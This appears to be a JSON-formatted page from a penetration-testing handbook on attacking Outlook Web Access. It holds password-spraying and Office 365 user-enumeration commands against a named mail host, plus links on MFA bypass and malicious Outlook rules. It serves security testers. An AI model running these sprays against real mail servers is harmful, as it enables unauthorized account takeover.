@@ -1,0 +1,82 @@
+{
+    "title": "OWA",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Technologies",
+            "url": "/enumeration/webservices"
+        }
+    ],
+    "sections": [
+        {
+            "heading": "Tools",
+            "type": "code_block",
+            "content": [
+                "# https://github.com/dafthack/MailSniper",
+                "# Spraying toolkit: https://github.com/byt3bl33d3r/SprayingToolkit",
+                "Invoke-PasswordSprayOWA -ExchHostName mail.r-1x.com -UserList C:\\users.txt -Password Dakota2019! -OutFile C:\\creds.txt -Threads 10",
+                "python3 atomizer.py owa mail.r-1x.com 'Dakota2019!' ../users.txt",
+                "",
+                "# https://github.com/gremwell/o365enum",
+                "./o365enum.py -u users.txt -p Password2 -n 1",
+                "",
+                "# https://github.com/mdsecactivebreach/o365-attack-toolkit",
+                ""
+            ]
+        },
+        {
+            "heading": "Bypasses",
+            "type": "code_block",
+            "content": [
+                "# UserName Recon/Password Spraying - http://www.blackhillsinfosec.com/?p=4694",
+                "# Password Spraying MFA/2FA - http://www.blackhillsinfosec.com/?p=5089",
+                "# Password Spraying/GlobalAddressList - http://www.blackhillsinfosec.com/?p=5330",
+                "# Outlook 2FA Bypass - http://www.blackhillsinfosec.com/?p=5396",
+                "# Malicious Outlook Rules - https://silentbreaksecurity.com/malicious-outlook-rules/",
+                "# Outlook Rules in Action - http://www.blackhillsinfosec.com/?p=5465",
+                "",
+                "Name Conventions:",
+                "- FirstnameLastinitial",
+                "- FirstnameLastname",
+                "- Lastname.firstname"
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2020-11-10T12:00:31.666Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/webservices/owa.md",
+        "previous_page": {
+            "title": "Firebase",
+            "url": "/enumeration/webservices/firebase"
+        },
+        "next_page": {
+            "title": "OAuth",
+            "url": "/enumeration/webservices/oauth"
+        }
+    }
+}
